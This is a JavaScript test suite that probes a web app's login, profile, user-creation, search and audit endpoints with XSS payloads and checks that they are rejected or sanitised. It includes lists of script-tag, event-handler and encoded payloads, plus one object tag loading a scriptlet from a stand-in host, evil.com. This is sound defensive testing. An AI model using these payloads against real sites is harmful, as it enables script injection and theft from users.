#!/usr/bin/env node

/**
 * XSS Security Protection Test Suite
 * Tests Cross-Site Scripting (XSS) prevention across all endpoints
 *
 * Endpoints tested:
 * - POST /api/auth/login - Login form XSS protection (email/password fields)
 * - PUT /api/user/profile - Profile update XSS sanitization
 * - POST /api/admin/users - User creation XSS prevention
 * - GET /api/admin/users - Search parameter sanitization
 * - GET /api/audit/logs - Audit search parameter sanitization (if available)
 * - Multi-language endpoint testing (?lang= parameter)
 *
 * Test coverage:
 * - Basic XSS prevention (script tags, javascript: URLs, event handlers)
 * - Advanced XSS vectors (iframe, object, embed, encoded payloads)
 * - Input sanitization across all form fields
 * - Search parameter XSS prevention
 * - Multi-language XSS validation with i18n support
 * - Encoded XSS payloads (HTML entities, URL encoding)
 * - Legitimate content preservation after sanitization
 * - Security response headers validation
 * - Cross-endpoint XSS consistency testing
 * - User input field sanitization and validation
 * - Audit system XSS protection (when available)
*/

import { TestClient } from './utils/testClient.js';
import { TestLogger } from './utils/testLogger.js';
import { TestAssertions } from './utils/testAssertions.js';
import { TEST_USERS, API_ENDPOINTS, TEST_CONFIG, TEST_LANGUAGES } from './config/testConfig.js';

// XSS Test Payloads
const XSS_PAYLOADS = {
  basic: [
    '<script>alert(\'XSS\')</script>',
    'javascript:alert(\'XSS\')',
    '<img src=x onerror=alert(\'XSS\')>',
    '\';alert(\'XSS\');//'
  ],
  advanced: [
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<object data="javascript:alert(\'XSS\')"></object>',
    '<embed src="javascript:alert(\'XSS\')">',
    '<link href="javascript:alert(\'XSS\')" rel="stylesheet">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    'vbscript:alert(\'XSS\')',
    'data:text/html,<script>alert(\'XSS\')</script>',
    '<svg onload=alert(\'XSS\')>',
    '<body onload=alert(\'XSS\')>',
    '<input onfocus=alert(\'XSS\') autofocus>',
    'expression(alert(\'XSS\'))',
    'url(javascript:alert(\'XSS\'))',
    '@import \'javascript:alert(\'XSS\')\';'
  ],
  encoded: [
    '&lt;script&gt;alert(\'XSS\')&lt;/script&gt;',
    '%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E',
    '&#60;script&#62;alert(&#39;XSS&#39;)&#60;/script&#62;'
  ]
};

class XSSSecurityTest {
  constructor() {
    // Initialize in standard order
    this.logger = new TestLogger();
    this.client = new TestClient(TEST_CONFIG.baseUrl);
    this.assert = TestAssertions;

    // Test-specific properties
    this.accessToken = null;
  }

  async runAll() {
    this.logger.logSuiteHeader('🛡️ Starting XSS Security Tests');

    this.logger.info('Initializing test environment...');
    try {
      await this.setupAuthentication();
      this.logger.success('Authentication completed successfully');
    } catch (error) {
      this.logger.error(`[runAll] Authentication setup failed: ${error.message}`);
      throw error;
    }

    const tests = [
      this.testLoginXSSProtection,
      this.testProfileUpdateXSSProtection,
      this.testUserCreationXSSProtection,
      this.testSearchXSSProtection,
      this.testAdvancedXSSVectors,
      this.testBasicXSSPrevention,
      this.testAdvancedXSSScenarios,
      this.testI18nXSSPrevention,
      this.testAuditSystemXSSProtection,
      this.testMultiLanguageXSSValidation,
      this.testUserInputSanitization,
      this.testResponseHeaderSecurity
    ];

    // Process tests using standard pattern
    for (const test of tests) {
      try {
        await test.call(this);
        this.logger.recordResult(true);
        this.logger.success(`${test.name} passed`);
      } catch (error) {
        this.logger.recordResult(false);
        this.logger.error(`[runAll] [${test.name}] failed: ${error.message}`);
      }
    }

    this.logger.logSummary();

    if (this.logger.failCount > 0) {
      process.exit(1);
    }
  }

  async setupAuthentication() {
    try {
      this.logger.info('Setting up authentication for XSS tests...');

      const result = await this.client.post(API_ENDPOINTS.login, TEST_USERS.super_admin);

      this.assert.assertTrue(result.success, 'Authentication should succeed');
      this.assert.assertTrue(!!result.data.data.access_token, 'Should receive access token');

      this.accessToken = result.data.data.access_token;
      this.client.setAuthToken(this.accessToken);

      this.logger.success('Authentication setup completed successfully');
    } catch (error) {
      this.logger.error(`[setupAuthentication] Auth token setup failed: ${error.message}`);
      throw error;
    }
  }

  async testLoginXSSProtection() {
    this.logger.info('Testing XSS protection in login endpoint...');

    try {
      for (const payload of XSS_PAYLOADS.basic) {
        // Test XSS in email field
        const emailTestData = {
          email: payload,
          password: 'password123'
        };

        const emailResult = await this.client.post(API_ENDPOINTS.login, emailTestData);

        // Should not return 500 (server error) which might indicate injection
        this.assert.assertNotEqual(emailResult.status, 500, 'Should not cause server error');

        // Should reject malicious input
        this.assert.assertFalse(emailResult.success, 'Should reject XSS payload in email');

        // Test XSS in password field
        const passwordTestData = {
          email: TEST_USERS.valid.email,
          password: payload
        };

        const passwordResult = await this.client.post(API_ENDPOINTS.login, passwordTestData);
        this.assert.assertNotEqual(passwordResult.status, 500, 'Should not cause server error');
      }

      this.logger.success('Login XSS protection test completed successfully');
    } catch (error) {
      this.logger.error(`[testLoginXSSProtection] Login XSS protection test failed: ${error.message}`);
      throw error;
    }
  }

  async testProfileUpdateXSSProtection() {
    this.logger.info('Testing XSS protection in profile update...');

    try {
      for (const payload of [...XSS_PAYLOADS.basic, ...XSS_PAYLOADS.advanced]) {
        const updateData = { full_name: payload };

        const result = await this.client.put(API_ENDPOINTS.profile, updateData);

        // Should not return 500 (server error)
        this.assert.assertNotEqual(result.status, 500, 'Should not cause server error');

        // Should either reject (400/422) or sanitize the input (200)
        if (result.status === 200 && result.success) {
          const userData = result.data.data;
          if (userData && userData.full_name) {
            const sanitizedValue = userData.full_name;
            // Should not contain raw XSS payloads
            this.assert.assertFalse(
              sanitizedValue.includes('<script>') ||
              sanitizedValue.includes('javascript:') ||
              sanitizedValue.includes('onerror='),
              'Profile should not contain unsanitized XSS payload'
            );
          }
        }
      }

      this.logger.success('Profile update XSS protection test completed successfully');
    } catch (error) {
      this.logger.error(`[testProfileUpdateXSSProtection] Profile update XSS protection test failed: ${error.message}`);
      throw error;
    }
  }

  async testUserCreationXSSProtection() {
    this.logger.info('Testing XSS protection in user creation...');

    try {
      for (const payload of XSS_PAYLOADS.basic) {
        const userData = {
          full_name: payload,
          email: `testuser_${Date.now()}@example.com`,
          password: 'password123',
          role: 'user',
          status: 'active'
        };

        const result = await this.client.post(API_ENDPOINTS.adminUsers, userData);

        // Should not return 500 (server error)
        this.assert.assertNotEqual(result.status, 500, 'Should not cause server error');

        // Should either reject (400/422) or sanitize the input (201)
        if (result.status === 201 && result.success) {
          const createdUser = result.data.data;
          if (createdUser && createdUser.full_name) {
            const sanitizedValue = createdUser.full_name;
            // Should not contain raw XSS payloads
            this.assert.assertFalse(
              sanitizedValue.includes('<script>') ||
              sanitizedValue.includes('javascript:') ||
              sanitizedValue.includes('onerror='),
              'Created user should not contain unsanitized XSS payload'
            );
          }
        }
      }

      this.logger.success('User creation XSS protection test completed successfully');
    } catch (error) {
      this.logger.error(`[testUserCreationXSSProtection] User creation XSS protection test failed: ${error.message}`);
      throw error;
    }
  }

  async testSearchXSSProtection() {
    this.logger.info('Testing XSS protection in search queries...');

    try {
      for (const payload of XSS_PAYLOADS.basic) {
        const searchUrl = `${API_ENDPOINTS.adminUsers}?search=${encodeURIComponent(payload)}`;
        const result = await this.client.get(searchUrl);

        // Should not return 500 (server error)
        this.assert.assertNotEqual(result.status, 500, 'Should not cause server error');

        // Response should not contain unsanitized XSS
        const responseText = JSON.stringify(result);
        this.assert.assertFalse(
          responseText.includes('<script>') ||
          responseText.includes('javascript:') ||
          responseText.includes('onerror='),
          'Search response should not contain unsanitized XSS payload'
        );
      }

      this.logger.success('Search XSS protection test completed successfully');
    } catch (error) {
      this.logger.error(`[testSearchXSSProtection] Search XSS protection test failed: ${error.message}`);
      throw error;
    }
  }

  async testAdvancedXSSVectors() {
    this.logger.info('Testing advanced XSS attack vectors...');

    try {
      // Test encoded XSS payloads
      for (const payload of XSS_PAYLOADS.encoded) {
        const testData = {
          full_name: payload,
          email: `encoded_test_${Date.now()}@example.com`,
          password: 'password123',
          role: 'user',
          status: 'active'
        };

        const result = await this.client.post(API_ENDPOINTS.adminUsers, testData);

        // Should handle encoded payloads securely
        this.assert.assertNotEqual(result.status, 500, 'Should not cause server error with encoded payload');

        // Should either reject malicious encoded input (400/422) or neutralize it (201)
        if (result.status === 400 || result.status === 422) {
          // Input was properly rejected - this is good security behavior
          this.logger.info(`Encoded XSS payload rejected: ${payload}`);
        } else if (result.status === 201 && result.success) {
          const createdUser = result.data.data;
          if (createdUser && createdUser.full_name) {
            const value = createdUser.full_name;

            // Should not contain any executable script tags or dangerous patterns
            this.assert.assertFalse(
              value.includes('<script') ||
              value.includes('</script>') ||
              value.includes('<SCRIPT') ||
              value.includes('</SCRIPT>'),
              'Should not contain executable script tags'
            );

            // Should not contain dangerous JavaScript protocols and event handlers
            this.assert.assertFalse(
              value.includes('javascript:') ||
              value.includes('vbscript:') ||
              value.includes('onerror=') ||
              value.includes('onload=') ||
              value.includes('onclick=') ||
              value.includes('onfocus=') ||
              value.match(/on\w+\s*=/),
              'Should not contain dangerous JavaScript patterns'
            );

            // Should not contain executable combinations that could be harmful
            this.assert.assertFalse(
              (value.includes('<script') && value.includes('alert')) ||
              (value.includes('javascript:') && value.includes('alert')) ||
              (value.includes('onerror') && value.includes('alert')),
              'Should not contain executable XSS combinations'
            );

            this.logger.info(`XSS payload neutralized: ${payload} → ${value}`);
          }
        } else {
          throw new Error(`Unexpected response status: ${result.status}`);
        }
      }

      // Test that legitimate content still works
      const legitimateData = {
        full_name: 'John O\'Connor & Associates < Legal Firm >',
        email: `legitimate_${Date.now()}@example.com`,
        password: 'password123',
        role: 'user',
        status: 'active'
      };

      const legitResult = await this.client.post(API_ENDPOINTS.adminUsers, legitimateData);

      if (legitResult.status === 201) {
        const user = legitResult.data.data;
        this.assert.assertTrue(
          user.full_name.includes('John') && user.full_name.includes('Legal Firm'),
          'Legitimate content should be preserved (with safe HTML encoding)'
        );
        this.logger.info(`Legitimate content preserved: ${user.full_name}`);
      }

      this.logger.success('Advanced XSS vectors test completed successfully');
    } catch (error) {
      this.logger.error(`[testAdvancedXSSVectors] Advanced XSS vectors test failed: ${error.message}`);
      throw error;
    }
  }

  async testBasicXSSPrevention() {
    this.logger.info('Testing basic XSS prevention mechanisms...');

    try {
      // Test basic script tag injection
      const basicPayloads = [
        '<script>alert("XSS")</script>',
        '<IMG SRC="javascript:alert(\'XSS\');">',
        '<svg/onload=alert("XSS")>'
      ];

      for (const payload of basicPayloads) {
        const testData = { full_name: payload };
        const result = await this.client.put(API_ENDPOINTS.profile, testData);

        this.assert.assertNotEqual(result.status, 500, 'Should not cause server error');

        if (result.success && result.data.data) {
          const sanitizedValue = result.data.data.full_name || '';
          this.assert.assertFalse(
            sanitizedValue.includes('<script>') || sanitizedValue.includes('javascript:'),
            'Basic XSS payload should be sanitized'
          );
        }
      }

      this.logger.success('Basic XSS prevention test completed successfully');
    } catch (error) {
      this.logger.error(`[testBasicXSSPrevention] Basic XSS prevention test failed: ${error.message}`);
      throw error;
    }
  }

  async testAdvancedXSSScenarios() {
    this.logger.info('Testing advanced XSS attack scenarios...');

    try {
      // Test various advanced XSS vectors
      const advancedPayloads = [
        'javascript:alert(String.fromCharCode(88,83,83))',
        '<object type="text/x-scriptlet" data="http://evil.com/xss.sct">',
        '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">'
      ];

      for (const payload of advancedPayloads) {
        const testData = { full_name: payload };
        const result = await this.client.put(
          API_ENDPOINTS.profile,
          testData,
          {},
          { timeoutMs: 5000, retries: 1 }
        );

        this.assert.assertNotEqual(result.status, 500, 'Should not cause server error');

        if (result.success && result.data.data) {
          const sanitizedValue = result.data.data.full_name || '';
          this.assert.assertFalse(
            sanitizedValue.includes('javascript:') ||
            sanitizedValue.includes('<object') ||
            sanitizedValue.includes('<embed'),
            'Advanced XSS payload should be sanitized'
          );
        }
      }

      this.logger.success('Advanced XSS scenarios test completed successfully');
    } catch (error) {
      this.logger.error(`[testAdvancedXSSScenarios] Advanced XSS scenarios test failed: ${error.message}`);
      throw error;
    }
  }

  async testI18nXSSPrevention() {
    this.logger.info('Testing i18n XSS prevention...');

    try {
      // Test XSS in different language contexts
      const i18nPayloads = [
        '<script>alert("XSS中文")</script>',
        '<img src=x onerror=alert("XSS français")>',
        'javascript:alert("XSS العربية")'
      ];

      for (const payload of i18nPayloads) {
        const testData = { full_name: payload };
        const result = await this.client.put(API_ENDPOINTS.profile, testData);

        this.assert.assertNotEqual(result.status, 500, 'Should not cause server error');

        if (result.success && result.data.data) {
          const sanitizedValue = result.data.data.full_name || '';
          this.assert.assertFalse(
            sanitizedValue.includes('<script>') ||
            sanitizedValue.includes('javascript:') ||
            sanitizedValue.includes('onerror='),
            'i18n XSS payload should be sanitized'
          );
        }
      }

      this.logger.success('i18n XSS prevention test completed successfully');
    } catch (error) {
      this.logger.error(`[testI18nXSSPrevention] i18n XSS prevention test failed: ${error.message}`);
      throw error;
    }
  }

  async testAuditSystemXSSProtection() {
    this.logger.info('Testing audit system XSS protection...');

    try {
      // Test XSS in audit search if endpoint exists
      try {
        const searchPayload = '<script>alert("XSS")</script>';
        const searchUrl = `${API_ENDPOINTS.auditLogs}?search=${encodeURIComponent(searchPayload)}`;
        const result = await this.client.get(searchUrl);

        this.assert.assertNotEqual(result.status, 500, 'Should not cause server error');

        const responseText = JSON.stringify(result);
        this.assert.assertFalse(
          responseText.includes('<script>'),
          'Audit search response should not contain unsanitized XSS'
        );
      } catch (error) {
        if (error.response && error.response.status === 404) {
          this.logger.warning('Audit system endpoint not implemented - skipping');
        } else {
          throw error;
        }
      }

      this.logger.success('Audit system XSS protection test completed successfully');
    } catch (error) {
      this.logger.error(`[testAuditSystemXSSProtection] Audit system XSS protection test failed: ${error.message}`);
      throw error;
    }
  }

  async testMultiLanguageXSSValidation() {
    this.logger.info('Testing multi-language XSS validation...');

    try {
      // Test XSS with different language parameters
      const xssPayload = '<script>alert("XSS")</script>';

      for (const lang of TEST_LANGUAGES) {
        try {
          const testData = { full_name: xssPayload };
          const result = await this.client.put(`${API_ENDPOINTS.profile}?lang=${lang}`, testData);

          this.assert.assertNotEqual(result.status, 500, 'Should not cause server error');

          if (result.success && result.data.data) {
            const sanitizedValue = result.data.data.full_name || '';
            this.assert.assertFalse(
              sanitizedValue.includes('<script>'),
              `XSS payload should be sanitized for language: ${lang}`
            );
          }
        } catch (error) {
          if (error.response && error.response.status === 404) {
            this.logger.warning(`Language ${lang} not supported - skipping`);
          } else {
            throw error;
          }
        }
      }

      this.logger.success('Multi-language XSS validation test completed successfully');
    } catch (error) {
      this.logger.error(`[testMultiLanguageXSSValidation] Multi-language XSS validation test failed: ${error.message}`);
      throw error;
    }
  }

  async testUserInputSanitization() {
    this.logger.info('Testing user input sanitization...');

    try {
      // Test various input fields for proper sanitization
      const sanitizationTests = [
        { field: 'full_name', payload: '<b>Bold</b> text' },
        { field: 'full_name', payload: 'Text with "quotes" and \'apostrophes\'' },
        { field: 'full_name', payload: 'Text with & ampersand < brackets >' }
      ];

      for (const test of sanitizationTests) {
        const testData = { [test.field]: test.payload };
        const result = await this.client.put(API_ENDPOINTS.profile, testData);

        if (result.success && result.data.data) {
          const sanitizedValue = result.data.data[test.field] || '';
          // Should preserve safe content while encoding dangerous characters
          this.assert.assertTrue(
            sanitizedValue.length > 0,
            'Legitimate content should not be completely removed'
          );
        }
      }

      this.logger.success('User input sanitization test completed successfully');
    } catch (error) {
      this.logger.error(`[testUserInputSanitization] User input sanitization test failed: ${error.message}`);
      throw error;
    }
  }

  async testResponseHeaderSecurity() {
    this.logger.info('Testing security response headers...');

    try {
      // Test for security headers in responses
      const result = await this.client.get(API_ENDPOINTS.profile);

      // Check for common security headers
      const headers = result.headers || {};
      const securityHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'content-security-policy'
      ];

      let foundSecurityHeaders = 0;
      for (const header of securityHeaders) {
        if (headers[header] || headers[header.toUpperCase()]) {
          foundSecurityHeaders++;
          this.logger.info(`Found security header: ${header}`);
        }
      }

      // At least some security headers should be present
      if (foundSecurityHeaders > 0) {
        this.logger.success(`Found ${foundSecurityHeaders} security headers`);
      } else {
        this.logger.warning('No common security headers found');
      }

      this.logger.success('Response header security test completed successfully');
    } catch (error) {
      this.logger.error(`[testResponseHeaderSecurity] Response header security test failed: ${error.message}`);
      throw error;
    }
  }
}

// Export and run if called directly
export { XSSSecurityTest };

if (import.meta.url === `file://${process.argv[1]}`) {
  const tests = new XSSSecurityTest();
  tests.runAll().catch(error => {
    console.error('Test execution failed:', error);
    process.exit(1);
  });
}
